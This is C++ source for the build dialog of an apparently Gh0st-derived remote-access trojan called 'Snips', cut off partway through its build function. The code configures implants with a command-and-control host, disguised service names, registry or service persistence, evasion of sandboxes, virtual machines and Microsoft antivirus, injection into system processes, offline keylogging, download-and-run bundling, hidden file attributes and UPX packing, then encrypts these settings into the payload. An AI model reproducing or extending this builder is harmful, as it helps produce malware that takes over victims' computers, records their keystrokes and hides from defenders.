// BuildDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "BuildDlg.h"
#include "ClientView.h"
#include "SettingDlg.h"
#include "MyToolsKit.h"
#include <shlwapi.h>
#include <WinInet.h>
#include <afxinet.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CBuildDlg dialog
CBuildDlg::CBuildDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CBuildDlg::IDD, pParent)
{
	Pattern = false;
	//{{AFX_DATA_INIT(CBuildDlg)
	m_edit_host = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","HOST","127.0.0.1");   //上线IP
	m_edit_port = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "PORT",8081);   //上线端口
	Fenzu = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Fenzu","Fatal");   //上线分组
	m_DllName = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "DllName", "Svwxya.exe"); //安装名称
	m_service_name = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","SVCNAME","Stuvwx Abcdefgh");
	m_service_displayname = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","DISNAME","Stuvwx Abcdefgh Jklmnopq Stuv");
	m_service_description = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","SVCDES","Stuvwxya Cdefghijk Mnopqrs Uvwxyabc Efg");
	
	m_edit_kb = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","Url","https://www.baidu.com/img/bd_logo1.png"); //捆绑
	m_zrAzst = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","ZAzst",0);       //写入安装类型
	if(m_zrAzst == 0)
	{
		m_zraz = 1;
		m_zraz1 = 0;
		m_zraz2 = 0;
	}
	else if(m_zrAzst == 1)
	{
		m_zraz1 = 1;
		m_zraz = 0;
		m_zraz2 = 0;
	}
	else if(m_zrAzst == 2)
	{
		m_zraz2 = 1;
		m_zraz1 = 0;
		m_zraz = 0; 	
	}
	
	//////
	m_fwb = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FWB",1);   //反微步
	m_fhb = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FHB",1);   //反哈勃
	m_fxn = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FXN",0);   //反虚拟
	m_ffx = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FFX",0);   //防分析
	m_fsc = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FSC",0);   //防删除
	m_fzs = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FZS",0);   //自删除
	m_fcf = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FCF",1);   //防重复
	m_ffh = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FFH",0);   //注入复活
	m_fct = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FCT",0);   //内网穿透
	m_fzj = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FZJ",0);   //K终结者
	m_fkb = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FKB",0);   //捆绑
	m_fbc = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FBC",1);   //保存
	m_fsm = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FSM",1);   //睡眠阻止
	m_flx = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FLX",0);   //离线键盘
	m_fwr = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FWR",0);   //微软杀毒
	m_upx = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","Upx",0);   //upx压缩
	//}}AFX_DATA_INIT
}


void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildDlg)
	DDX_Control(pDX, IDC_ICONS, m_Ico);
	DDX_Control(pDX, IDC_EDIT_LOG, m_edit_log);
	DDX_CBString(pDX,IDC_COMBO_GROUP_NAME, Fenzu);//默认分组
	DDX_Control(pDX, IDC_COMBO_GROUP_NAME, m_group_name);
	DDX_Control(pDX, IDC_FILEATTRIBUTE1, m_FileAttrbute);//文件属性
	DDX_Control(pDX, IDC_COMBO_RELEASEPATH, m_remote_path);//安装路径
	DDX_Text(pDX, IDC_COMBO_RELEASEPATH, m_releasepath);
	DDX_Text(pDX, IDC_EDIT_HOST, m_edit_host);
	DDX_Text(pDX, IDC_EDIT_SERVICE_NAME, m_service_name);
	DDX_Text(pDX, IDC_EDIT_SERVICE_DISPLAYNAME, m_service_displayname);
	DDX_Text(pDX, IDC_EDIT_SERVICE_DESCRIPTION, m_service_description);
	DDX_Text(pDX, IDC_EDIT_PORT, m_edit_port);
	DDV_MinMaxUInt(pDX, m_edit_port, 0, 65535);
	DDX_Text(pDX, IDC_EDIT_KB, m_edit_kb);
	DDX_Check(pDX, IDC_CHECK1, m_fwb);
	DDX_Check(pDX, IDC_CHECK2, m_fhb);
	DDX_Check(pDX, IDC_CHECK3, m_fxn);
	DDX_Check(pDX, IDC_CHECK4, m_ffx);
	DDX_Check(pDX, IDC_CHECK5, m_fsc);
	DDX_Check(pDX, IDC_CHECK6, m_fzs);
	DDX_Check(pDX, IDC_CHECK7, m_fcf);
	DDX_Check(pDX, IDC_CHECK8, m_ffh);
	DDX_Check(pDX, IDC_CHECK9, m_fct);
	DDX_Check(pDX, IDC_CHECK10, m_fzj);
	DDX_Check(pDX, IDC_CHECK11, m_fbc);//保存
	DDX_Check(pDX, IDC_CHECK12, m_fsm);//睡眠
	DDX_Check(pDX, IDC_CHECK13, m_flx);//离线
	DDX_Check(pDX, IDC_CHECK14, m_fwr);//过微软杀毒
	DDX_Check(pDX, IDC_UPX, m_upx); //UPX
	DDX_Check(pDX, IDC_KBCHECK, m_fkb);//捆绑
	DDX_Check(pDX, IDC_ZRAZ, m_zraz);//绿色启动
	DDX_Check(pDX, IDC_ZRAZ1, m_zraz1);   //注册表启动
	DDX_Check(pDX, IDC_ZRAZ2, m_zraz2);   //服务启动安装
	DDX_Text(pDX, IDC_DLL_NAME, m_DllName);//文件名称
//	DDX_Control(pDX, IDC_COMBO_INSTALL, m_como_install);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
	//{{AFX_MSG_MAP(CBuildDlg)

	ON_WM_PAINT()
	ON_BN_CLICKED(IDC_BUTTON_TEST_CONNECT, OnButtonTestConnect)
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	ON_BN_CLICKED(IDC_ZRAZ, OnZraz)
	ON_BN_CLICKED(IDC_ZRAZ1, OnZraz1)
	ON_BN_CLICKED(IDC_ZRAZ2, OnZraz2)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDOK, OnOK)
	ON_BN_CLICKED(IDC_ICONS, OnSelectIco)
	ON_BN_CLICKED(IDC_KBTEST, OnKbtest)
	ON_BN_CLICKED(IDC_KBCHECK, OnKbcheck)
	ON_BN_CLICKED(IDC_PATTERN, OnPattern)
	ON_BN_CLICKED(IDC_CHECK1,Ontixin1)
	ON_BN_CLICKED(IDC_CHECK2,Ontixin2)
	ON_BN_CLICKED(IDC_CHECK3,Ontixin3)
	ON_BN_CLICKED(IDC_CHECK4,Ontixin4)
	ON_BN_CLICKED(IDC_CHECK5,Ontixin5)
	ON_BN_CLICKED(IDC_CHECK6,Ontixin6)
	ON_BN_CLICKED(IDC_CHECK7,Ontixin7)
	ON_BN_CLICKED(IDC_CHECK8,Ontixin8)
	ON_BN_CLICKED(IDC_CHECK9,Ontixin9)
	ON_BN_CLICKED(IDC_CHECK10,Ontixin10)
	ON_BN_CLICKED(IDC_CHECK11,Ontixin11)
	ON_BN_CLICKED(IDC_CHECK12,Ontixin12)
	ON_BN_CLICKED(IDC_CHECK13,Ontixin13)
	ON_BN_CLICKED(IDC_CHECK14,Ontixin14)
	ON_BN_CLICKED(IDC_UPX,Ontixin15)
//	ON_BN_CLICKED(IDC_GETINFO,OnTest)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildDlg message handlers

///颜色提示
void CBuildDlg::LogOut(LPCSTR outtext)
{
	int length = m_edit_log.GetWindowTextLength();
	m_edit_log.SetSel(length, length);
	m_edit_log.ReplaceSel (outtext); 
}
HBRUSH CBuildDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor) 
{
	int nCtrlID = pWnd->GetDlgCtrlID();
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	if ((nCtrlID == IDC_EDIT_LOG) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr); //设置绿色的文本
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr); //设置黑色的背景
		hbr = CreateSolidBrush(clr); //作为约定，返回背景色对应的刷子句柄
	}
	else if ((nCtrlID==IDC_EDIT_HOST ||nCtrlID==IDC_EDIT_PORT) && m_fct)
	{
		COLORREF clr = RGB(255, 0, 0);
		pDC->SetTextColor(clr);   //穿透开启设置红色的文本
	}
	return hbr;
}
void CBuildDlg::OnZras() 
{
	GetDlgItem(IDC_CHECK8)->EnableWindow(TRUE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECK5)->EnableWindow(FALSE);
	GetDlgItem(IDC_RANDOM)->EnableWindow(FALSE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SERVICE_NAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SERVICE_DISPLAYNAME)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_SERVICE_DESCRIPTION)->EnableWindow(FALSE);
}
void CBuildDlg::OnZras1()
{
	GetDlgItem(IDC_CHECK8)->EnableWindow(FALSE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(TRUE);
	GetDlgItem(IDC_RANDOM)->EnableWindow(TRUE);
	GetDlgItem(IDC_CHECK5)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SERVICE_NAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SERVICE_DISPLAYNAME)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_SERVICE_DESCRIPTION)->EnableWindow(TRUE);
}
void CBuildDlg::OnZraz() 
{
	// TODO: Add your control notification handler code here
	LogOut("\r\n\r\n绿色启动\r\n\r\n\r\n\r\n");
	OnZras();
}

void CBuildDlg::OnZraz1() 
{
	// TODO: Add your control notification handler code here
	LogOut("\r\n\r\n注册启动\r\n\r\n\r\n\r\n");
	OnZras();
}

void CBuildDlg::OnZraz2() 
{
	// TODO: Add your control notification handler code here
	LogOut("\r\n\r\n服务启动\r\n\r\n\r\n\r\n");
	OnZras1();
}
void CBuildDlg::Ontixin1()
{
	UpdateData(TRUE);
	if(!m_fwb)
	{
		LogOut("\r\n反微步沙箱已关闭\r\n");
	}
	else
	{
		LogOut("\r\n反微步沙箱已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin2()
{
	UpdateData(TRUE);
	if(!m_fhb)
	{
		LogOut("\r\n反哈勃沙箱已关闭\r\n");
	}
	else
	{
		LogOut("\r\n反哈勃沙箱已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin3()
{
	UpdateData(TRUE);
	if(!m_fxn)
	{
		LogOut("\r\n反虚拟机已关闭\r\n");
	}
	else
	{
		LogOut("\r\n反虚拟机已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin4()
{
	UpdateData(TRUE);
	if(!m_ffx)
	{
		LogOut("\r\n超强防分析已关闭\r\n");
	}
	else
	{
		LogOut("\r\n超强版防分析已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin5()
{
	UpdateData(TRUE);
	if(!m_fsc)
	{
		LogOut("\r\n防删除占坑已关闭\r\n");
	}
	else
	{
		LogOut("\r\n防删除占坑已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin6()
{
	UpdateData(TRUE);
	if(!m_fzs)
	{
		LogOut("\r\n运行自删除已关闭\r\n");
	}
	else
	{
		LogOut("\r\n运行自删除已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin7()
{
	UpdateData(TRUE);
	if(!m_fcf)
	{
		LogOut("\r\n防止重复运行已关闭\r\n");
	}
	else
	{
		LogOut("\r\n防止重复运行已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin8()
{
	UpdateData(TRUE);
	if(!m_ffh)
	{
		LogOut("\r\n注入复活已关闭\r\n");
	}
	else
	{
		LogOut("\r\n注入复活已开启,运行会注入系统进程运行,杀毒可能会拦截\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin9()
{
	UpdateData(TRUE);
	if(!m_fct)
	{
		LogOut("\r\n内网穿透已关闭\r\n");
	}
	else
	{
		LogOut("\r\n内网穿透已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin10()
{
	UpdateData(TRUE);
	if(!m_fzj)
	{
		LogOut("\r\n\r\nKill终结者已关闭\r\n");
	}
	else
	{
		LogOut("\r\n\r\nKill终结者已开启\r\n");	
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin11()
{
	UpdateData(TRUE);
	if(!m_fbc)
	{
		LogOut("\r\n已取消保存\r\n");
	}
	else
	{
		LogOut("\r\n保存配置已开启\r\n");
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin12()
{
	UpdateData(TRUE);
	if(!m_fsm)
	{
		LogOut("\r\n睡眠阻止已关闭\r\n");
	}
	else
	{
		LogOut("\r\n睡眠阻止已开启,使目标主机不会自动进入休眠状态\r\n");
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin13()
{
	UpdateData(TRUE);
	if(!m_fsm)
	{
		LogOut("\r\n离线键盘已关闭\r\n");
	}
	else
	{
		LogOut("\r\n离线键盘已开启,目标主机上线自动离线记录键盘\r\n");
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin14()
{
	UpdateData(TRUE);
	if(!m_fwr)
	{
		LogOut("\r\n过微软杀毒已关闭\r\n");
	}
	else
	{
		LogOut("\r\n过微软杀毒已开启,会延迟启动小马\r\n");
	}
	UpdateData(FALSE);
}
void CBuildDlg::Ontixin15()
{
	UpdateData(TRUE);
	if(!m_upx)
	{
		LogOut("\r\nUPX压缩已关闭\r\n");
	}
	else
	{
		LogOut("\r\nUPX压缩已开启\r\n");
	}
	UpdateData(FALSE);
}
void CBuildDlg::OnKbcheck() 
{
	UpdateData(TRUE);
	// TODO: Add your control notification handler code here
	if (!m_fkb)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
		LogOut("\r\n捆绑已关闭\r\n");
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
		LogOut("\r\n捆绑已开启\r\n");
	}
	UpdateData(FALSE);
}

BOOL CBuildDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	HINSTANCE hInstResource = AfxFindResourceHandle(MAKEINTRESOURCE(IDI_MGICON_A),RT_GROUP_ICON);
	HICON m_hIcon = (HICON)::LoadImage(hInstResource,MAKEINTRESOURCE(IDI_MGICON_A),IMAGE_ICON,24, 24, 0);
	if( m_hIcon != 0 )
	{
		SetIcon(m_hIcon,TRUE);
	}
	UpdateData(false);

	CheckRadioButton(IDC_EDIT_LOG,IDC_EDIT_LOG,IDC_EDIT_LOG);

	LogOut("Snips <8.0> 远程管理系统\r\n");
	LogOut("\r\n切勿使用非法用途\r\n");
Sleep(100);

	if (m_zraz)
	{
		LogOut("\r\n当前配置为绿色启动\r\n");
		OnZras();
	}
	else
	{
		if (m_zraz1)
		{
			LogOut("\r\n当前配置为注册启动\r\n");
			OnZras();
		}
		if (m_zraz2)
		{
			LogOut("\r\n当前配置为服务启动\r\n");
			OnZras1();
		}
	}

	if (!m_fkb)
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(FALSE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_KB)->EnableWindow(TRUE);
		GetDlgItem(IDC_KBTEST)->EnableWindow(TRUE);
	}
	// TODO: Add extra initialization here
	CString strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	for ( int i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		m_group_name.AddString(strGroupName);
	}

	m_remote_path.SetCurSel(((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","InstallPath",10)); //安装路径
	m_FileAttrbute .SetCurSel(((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build","FileAttribute1",4)); //文件属性

	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}
BOOL CBuildDlg::IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;
	
	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}
BOOL CBuildDlg::CompressUpx(CString inpath)
{
	
	GetModuleFileName(NULL, patht,MAX_PATH);   //获取程序自身完整路径名称,即Gh0st.exe的路径
	PathRemoveFileSpec(patht);//去除文件名中的gh0st
	char Datpath[MAX_PATH];
	sprintf(Datpath,"%s\\Plugins\\upx.exe",patht);
	//检测upx.exe文件是否存在
	if (IsFileExist(Datpath)==FALSE)
	{
		LogOut("\r\nUPX.exe 不存在,\n请检查文件后再进行压缩...\r\n");
		return FALSE;
	}
	char Pnema[30]={0};
	char Path[MAX_PATH]={0};
	strcat(Path,inpath);
	int Psg = 0;
	int Pst = strlen(Path);
	for(int i=Pst;i>0;i--)
	{
		if(Path[i] == '\\')
		{
			for(int s=i+1;s<Pst;s++)
			{
				Pnema[Psg]=Path[s];
				Psg++;
			}
			Path[i]='\0';
			break;
		}
	}
	strcat(Path,"\\upx.exe");
	DeleteFile(Path);
	CopyFile(Datpath,Path,false);  //复制文件
	ShellExecute(this->m_hWnd,"open","upx.exe ",Pnema,"",SW_HIDE);
	
	BOOL del;
	do 
	{
		del = DeleteFile(Path);
	} while(!del);
	
	return TRUE;
}
int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

DLL_INFO dll_info = 
{
	"SVP7",       // 上线地址 1
		0,        // 上线端口 2
		0,        // 文件属性 3
		"",       // 上线分组 4
		"",       // 通讯密码 5
		"",       // 安装名称 6
		"",       // 服务名称 7
		"",       // 服务显示 8
		"",	      // 服务描述 9
		"",       // 安装途径 10
		"",       // 网络捆绑 11
		0,        // 启动类型 12
		0,        // 0关闭 1开启 微步检测 13
		0,        // 0关闭 1开启 哈勃检测 14
		0,        // 0关闭 1开启 虚拟检测 15
		0,        // 0关闭 1开启 分析检测 16
		0,        // 0关闭 1开启 防删检测 17
		0,        // 0关闭 1开启 自删检测 18
		0,        // 0关闭 1开启 重复检测 19
		0,        // 0关闭 1开启 复活检测 20
		0,        // 0关闭 1开启 穿透检测 21
		0,        // 0关闭 1开启 终结检测 22
		0,        // 0关闭 1开启 捆绑检测 23
		0,        // 0关闭 1开启 睡眠检测 24
		0,        // 0关闭 1开启 离线检测 25
		0,        // 0关闭 1开启 微软杀毒 26
};
//加密字符串
void DecryptData(char *szRec, unsigned long nLen, unsigned long key)
{
	unsigned long i;
	unsigned char p;
	p = (unsigned char ) key % 1451 + 61;
	
	for(i = 0; i < nLen; i++)
	{
		*szRec -= p;
		*szRec++ ^= p;
	}
}
#include "LOGIN.h"
extern CString IP1;
extern CString Decrypt(CString v, WORD K);
void CBuildDlg::OnOK() 
{
	// TODO: Add extra validation here
	UpdateData(TRUE);
	//判断加密的通讯秘钥是否存在
	CString Conpass = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Settings","ConnetPass","");
	if (Conpass == "")
	{
		if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
		{
			PlaySound(MAKEINTRESOURCE(IDR_WAVE_Key),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
		}
		m_edit_log.ReplaceSel( "\r\n\r\n\r\n\r\n通讯秘钥错误，请先设置秘钥！\r\n\r\n\r\n\r\n");
		return;
	}
	//----------------------------验证开始---------------------------//
/*	CString name = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("USER","username","");
	CString pass = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("USER","userpass","");
	CString passs =Decrypt(pass,1024);
	if (name == "")
	{
		m_edit_log.ReplaceSel("\r\n账号读取失败\r\n");
		return;
	}
	else if (passs == "" )
	{
		m_edit_log.ReplaceSel("\r\n密码读取失败\r\n");
		return;
	}
	//---------------------------------------//
	DWORD recvsize = 0;
	SOCKET sockInt;
	struct sockaddr_in serverAddr;
	WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2,2);
    WSAStartup(sockVersion, &wsaData);
	//创建SOCK
	sockInt = socket(AF_INET, SOCK_STREAM, 0);
	if(sockInt == INVALID_SOCKET)
	{
		m_edit_log.ReplaceSel("\r\ninisocket error\r\n");
		WSACleanup();
		return;
	}
	//------获取服务器IP和端口----//
	serverAddr.sin_family = AF_INET;    
	char tgtIP[30] = {0};
	struct hostent *hp = NULL;
	if ((hp = gethostbyname("svp7.net")) != NULL)
	{
		in_addr in;
		memcpy(&in, hp->h_addr, hp->h_length);
		lstrcpy(tgtIP,inet_ntoa(in));
	}
	serverAddr.sin_addr.s_addr = inet_addr(tgtIP);
	serverAddr.sin_port = htons(8689);

	//连接服务器
	GetDlgItem(IDOK)->EnableWindow(FALSE);
	m_edit_log.ReplaceSel("\r\n正在连接服务器.\r\n");
	if(connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
	{
		LogOut("\r\n连接服务器失败!\r\n");
		GetDlgItem(IDOK)->EnableWindow(TRUE);
		WSACleanup();
		return;
	}
	m_edit_log.ReplaceSel("\r\n连接成功.\r\n");
	char USERIMFOR[256] = {0}, buff[256] = {0};
	wsprintf(USERIMFOR, "Login:%s@%s",name,passs);
	if( send(sockInt, USERIMFOR, sizeof(USERIMFOR), 0) == SOCKET_ERROR )
	{
		m_edit_log.ReplaceSel("\r\n账号不存在!\r\n");
		WSACleanup();
		return;
	}
	Sleep(50);
	int Ret = recv( sockInt, buff, sizeof(buff), NULL );
	if ( Ret == 0 || Ret == SOCKET_ERROR )
	{
		m_edit_log.ReplaceSel("\r\n账号密码错误,或已到期!\r\n");
		closesocket(sockInt);
		WSACleanup();
		return;
	}
	//获取IP
	NET_DATA MyData;
	BYTE request[256] = {0};
	request[0] = Request_DOWN;
	send(sockInt,(char*)&request, sizeof(request),NULL);
	memset(&MyData,0,sizeof(NET_DATA));
	recv(sockInt,(char*)&MyData, sizeof(MyData),NULL);
	IP1 = MyData.Info;

	if (strstr( buff, "Pass" ) != NULL)//通过验证
	{
		m_edit_log.ReplaceSel("\r\n通过验证!\r\n\r\n");
		closesocket(sockInt);
		WSACleanup();
		m_edit_log.ReplaceSel(buff+6);
		m_edit_host = IP1;
		SetDlgItemText(IDC_EDIT_HOST,IP1);
		GetDlgItem(IDOK)->EnableWindow(TRUE);
		GetDlgItem(IDC_BUTTON_TEST_CONNECT)->EnableWindow(TRUE);
	}*/
	//----------------------------验证结束---------------------------//
	//解密Base64通讯
	CSettingDlg setdlg;
	Conpass = setdlg.Base64Decode(Conpass);
	Conpass = setdlg.Base64Decode(Conpass); //解密两次
	CString ch0(Conpass);
	DecryptData((char *)ch0.GetBuffer(0),strlen(ch0),18);
	lstrcpy(dll_info.ConnetPass,ch0.GetBuffer(0));//发送加密秘钥

	//上线分组
	if(Fenzu.IsEmpty())
	{
		LogOut("\r\n请输入上线分组!\r\n");
		return;
	}

	//上线地址
	CString ch1(m_edit_host);
	DecryptData((char *)ch1.GetBuffer(0),strlen(ch1),80);
	lstrcpy(dll_info.LoginAddr,ch1.GetBuffer(0)); 

	//上线分组
	CString ch2(Fenzu);
	DecryptData((char *)ch2.GetBuffer(0),strlen(ch2),18);
	lstrcpy(dll_info.UpGroup,ch2.GetBuffer(0));
	//端口
	dll_info.LoginPort=m_edit_port; 
	
	// 网络捆绑
	if (m_fkb)
	{
		CString ch3(m_edit_kb);
		DecryptData((char *)ch3.GetBuffer(0),strlen(ch3),18); //加密2
		lstrcpy(dll_info.szDownRun,ch3.GetBuffer(0));
	}
	//文件属性
	CString szTemp;
	GetDlgItemText(IDC_FILEATTRIBUTE1,szTemp);
	if(szTemp == "正常")
		dll_info.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if(szTemp == "隐藏")
		dll_info.FileAttribute = FILE_ATTRIBUTE_HIDDEN;
	
	if(szTemp == "系统")
		dll_info.FileAttribute = FILE_ATTRIBUTE_SYSTEM;
	
	if(szTemp == "只读")
		dll_info.FileAttribute = FILE_ATTRIBUTE_READONLY;
	
	if(szTemp == "隐藏+系统")
		dll_info.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	
	if(szTemp == "隐藏+系统+只读")
		dll_info.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;

	//安装类型
	if(m_zraz)
		m_zrAzst = 0;
	if(m_zraz1)
		m_zrAzst = 1;
	if(m_zraz2) //服务启动
	{
		m_zrAzst = 2;
		//安装路径
		if(m_releasepath.IsEmpty())
		{
			LogOut("\r\n请输入安装途径!\r\n");
			return;
		}
		//写入文件名称
		CString ch4(m_DllName);
		DecryptData((char *)ch4.GetBuffer(0),strlen(ch4),18);
		lstrcpy(dll_info.ReleaseName,ch4.GetBuffer(0)); 
		//服务名称
		CString ch5(m_service_name);
		DecryptData((char *)ch5.GetBuffer(0),strlen(ch5),18);
		lstrcpy(dll_info.ServiceName,ch5.GetBuffer(0));
        //服务显示
		CString ch6(m_service_displayname);
		DecryptData((char *)ch6.GetBuffer(0),strlen(ch6),18);
		lstrcpy(dll_info.ServiceDisplayName,ch6.GetBuffer(0));
		//服务描述
		CString ch7(m_service_description);
		DecryptData((char *)ch7.GetBuffer(0),strlen(ch7),18);
		lstrcpy(dll_info.ServiceDescription,ch7.GetBuffer(0));
		//写入安装路径
		CString ch8(m_releasepath);
		DecryptData((char *)ch8.GetBuffer(0),strlen(ch8),18);
		lstrcpy(dll_info.ReleasePath,ch8.GetBuffer(0));
	}
	dll_info.Dele_zc = m_zrAzst;//安装类型
	dll_info.Fwb = m_fwb; //反微步
	if (Pattern) //多文件关闭反哈勃
		m_fhb = 0;
	dll_info.Fhb = m_fhb; //反哈勃
	dll_info.Fxn = m_fxn; //反虚拟
	dll_info.Ffx = m_ffx; //防分析
	dll_info.Fsc = m_fsc; //防删除
	dll_info.Fzs = m_fzs; //自删除
	dll_info.Fcf = m_fcf; //防重复
	dll_info.Ffh = m_ffh; //注入复活
	dll_info.Fzj = m_fzj; //K终结者
	dll_info.Fkb = m_fkb; //捆绑开关
	dll_info.Fsm = m_fsm; //睡眠阻止
	dll_info.Flx = m_flx; //离线记录
	dll_info.Fwr = m_fwr; //微软杀毒
	dll_info.Fct = m_fct; //内网穿透
	
	//生成日期文件名字
	CString	strFileName,m_IPAddress;
	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("%m-%d-%H-%M"));
	
	PCHAR ExeBuff = NULL;
	HANDLE hFile = NULL;
	DWORD FileSize = 0, dwTmp = 0;
	TCHAR szSaveFile[MAX_PATH]={0};
	GetModuleFileName( NULL, DatPath, sizeof(DatPath));
	*strrchr( DatPath, '\\' ) = '\0';
	char BUILD[MAX_PATH];
	GetModuleFileName(NULL, BUILD,MAX_PATH);
	PathRemoveFileSpec(BUILD);
	Baocun = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build","BAOCUNEXE","");
	if (!Pattern)
	{	
		lstrcat(DatPath, "\\Cache\\Install.dat");
		if (GetFileAttributes(DatPath) == -1  )
		{
			m_edit_log.ReplaceSel( "\r\n\r\n没有找单文件Dat\r\n");
			GetDlgItem(IDOK)->EnableWindow(FALSE);
		}
		else
		{
			m_edit_log.ReplaceSel( "\r\n\r\n准备就绪可以生成\r\n");
		}
